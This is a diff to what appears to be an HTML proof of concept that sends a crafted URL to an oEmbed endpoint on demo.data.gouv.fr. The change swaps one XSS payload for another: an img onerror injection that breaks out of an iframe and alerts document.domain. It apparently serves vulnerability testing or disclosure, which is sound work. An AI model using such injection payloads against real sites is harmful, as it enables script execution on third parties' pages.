@@ -6,7 +6,7 @@
 <div id="result"></div>
 <script>
 const OEMBED_URL = "https://demo.data.gouv.fr/nuxt-api/oembed";
-const maliciousUrl = 'https://demo.data.gouv.fr/datasets/test"><script>alert("XSS_ON_THIRD_PARTY_SITE")<\/script><iframe x="';
+const maliciousUrl = 'https://demo.data.gouv.fr/datasets/test"></iframe><img src=x onerror=alert(document.domain)><iframe x="';
 
 fetch(`${OEMBED_URL}?url=${encodeURIComponent(maliciousUrl)}`)
   .then(r => r.json())
